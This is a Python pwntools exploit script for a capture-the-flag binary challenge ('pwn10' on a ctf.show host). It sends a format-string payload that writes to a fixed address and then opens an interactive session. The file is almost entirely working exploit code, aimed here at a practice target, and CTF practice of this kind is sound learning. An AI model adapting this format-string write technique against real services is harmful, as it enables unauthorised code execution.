# -*- coding: utf-8 -*-

import pwn
from pwn import *

fileName = './pwn10'
ip = 'pwn.challenge.ctf.show'
port = 28104

'''
[*] '/home/wkyuu/Desktop/pwn10'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

p32 = pwn.p32
u32 = pwn.u32

context(log_level='debug', os='linux', arch = 'amd64')
# p = process(fileName)
p = remote(ip, port)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
b *main+122
b *main+193
c
'''
# gdb.attach(p, gdbscript = gdbscript)

# leak_libc
logger('leak_libc')
payload = b'%16c%10$hhna' + p32(0x804a030)
p.sendlineafter(b'try pwn me?', payload)
p.interactive()